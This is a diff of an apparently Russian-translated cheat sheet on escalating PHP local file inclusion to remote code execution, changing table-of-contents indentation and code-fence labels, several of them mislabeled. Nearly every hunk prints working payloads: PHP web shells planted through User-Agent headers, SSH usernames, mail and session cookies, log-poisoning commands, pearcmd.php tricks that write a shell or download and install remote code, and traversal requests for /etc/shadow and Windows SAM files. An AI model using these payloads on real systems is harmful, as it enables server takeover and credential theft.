@@ -9,9 +9,9 @@
 * [LFI в RCE через загрузку (FindFirstFile)](#LFI-в-RCE-через-загрузку-FindFirstFile)
 * [LFI в RCE через phpinfo()](#LFI-в-RCE-через-phpinfo)
 * [LFI в RCE через контролируемый лог-файл](#LFI-в-RCE-через-контролируемый-лог-файл)
-* [RCE через SSH](#RCE-через-SSH)
-* [RCE через почту](#RCE-через-почту)
-* [RCE через логи Apache](#RCE-через-логи-Apache)
+    * [RCE через SSH](#RCE-через-SSH)
+    * [RCE через почту](#RCE-через-почту)
+    * [RCE через логи Apache](#RCE-через-логи-Apache)
 * [LFI в RCE через PHP сессии](#LFI-в-RCE-через-PHP-сессии)
 * [LFI в RCE через PHP PEARCMD](#LFI-в-RCE-через-PHP-PEARCMD)
 * [LFI в RCE через файлы учетных данных](#LFI-в-RCE-через-файлы-учетных-данных)
@@ -29,7 +29,7 @@ http://example.com/index.php?page=/proc/$PID/fd/$FD
 
 * Как и с лог-файлом, отправь полезную нагрузку в заголовке User-Agent, она отразится в файле /proc/self/environ
 
-```python
+```php
 GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
 User-Agent: <?=phpinfo(); ?>
 ```
@@ -57,7 +57,7 @@ User-Agent: <?=phpinfo(); ?>
 ```python
 http://example.com/index.php?page=path/to/uploaded/file.png&c=id
 ```
-```python
+```php
 Для JPEG:
 exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
 
@@ -119,7 +119,7 @@ PHPinfo() отображает содержимое любых переменн�
 
     Сделав несколько запросов загрузки на скрипт PHPInfo и тщательно контролируя чтения, можно получить имя временного файла и сделать запрос к скрипту LFI, указав имя временного файла.
 
-Используйте скрипт phpInfoLFI.py
+Используйте скрипт [phpInfoLFI.py](https://insomniasec.com/downloads/publications/phpinfolfi.py)
 
 # LFI в RCE через контролируемый лог-файл
 
@@ -144,13 +144,13 @@ http://example.com/index.php?page=/usr/local/apache2/log/error_log
 
 Попробуй подключиться по SSH с PHP кодом в качестве имени пользователя <?php system($_GET["cmd"]);?>.
 
-```bash
+```php
 ssh <?php system($_GET["cmd"]);?>@10.10.10.10
 ```
 
 Затем включите лог-файлы SSH в веб-приложении.
 
-```
+```python
 http://example.com/index.php?page=/var/log/auth.log&cmd=id
 ```
 
@@ -158,7 +158,7 @@ http://example.com/index.php?page=/var/log/auth.log&cmd=id
 
 Сначала отправьте email используя открытый SMTP, затем включите лог-файл расположенный по адресу http://example.com/index.php?page=/var/log/mail.
 
-```bash
+```python
 root@kali:~# telnet 10.10.10.10. 25
 Trying 10.10.10.10....
 Connected to 10.10.10.10..
@@ -179,7 +179,7 @@ data2
 
 В некоторых случаях вы также можете отправить email с помощью команды mail.
 
-```bash
+```php
 mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
 ```
 
@@ -187,7 +187,7 @@ mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
 
 Отравьте User-Agent в access logs:
 
-```bash
+```php
 curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
 ```
 
@@ -203,26 +203,26 @@ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 
 Проверьте, использует ли сайт PHP Session (PHPSESSID)
 
-```bash
+```python
 Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
 Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
 ```
 
 В PHP эти сессии хранятся в файлах /var/lib/php5/sess_[PHPSESSID] или /var/lib/php/sessions/sess_[PHPSESSID]
 
-```bash
+```pyhon
 /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
 user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
 ```
-Установите cookie в <?php system('cat /etc/passwd');?>
+Установите cookie в ```<?php system('cat /etc/passwd');?>```
 
-```bash
+```php
 login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
 ```
 
 # Используйте LFI для включения файла PHP сессии
 
-```bash
+```python
 login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
 ```
 
@@ -232,42 +232,42 @@ login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/s
 
 Файл pearcmd.php использует $_SERVER['argv'] для получения своих аргументов. Директива register_argc_argv должна быть установлена в On в конфигурации PHP (php.ini) для работы этой атаки.
 
-```
+```python
 register_argc_argv = On
 ```
 Есть несколько способов эксплуатации:
 
 * Метод 1: config create
 
-```
+```php
 /vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
 /vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
 ```
 
 * Метод 2: man_dir
 
-```
+```php
 /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
 /vuln.php?file=/tmp/exec.php&c=id
 ```
 
 Созданный конфигурационный файл содержит веб-шелл.
 
-```
+```php
 #PEAR_Config 0.9
 a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
 ```
 
 * Метод 3: download (требует внешнего сетевого подключения).
 
-```
+```php
 /vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
 /vuln.php?file=exec.php&c=id
 ```
 
 * Метод 4: install (требует внешнего сетевого подключения). Заметьте, что exec.php находится по пути /tmp/pear/download/exec.php.
 
-```
+```php
 /vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
 /vuln.php?file=/tmp/pear/download/exec.php&c=id
 ```
@@ -280,7 +280,7 @@ a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"ma
 
 1. Извлеките файлы sam и system.
 
-```
+```python
 http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
 http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
 ```
@@ -291,7 +291,7 @@ http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
 
 1. Извлеките файлы /etc/shadow.
 
-```bash
+```python
 http://example.com/index.php?page=../../../../../../etc/shadow
 ```
 
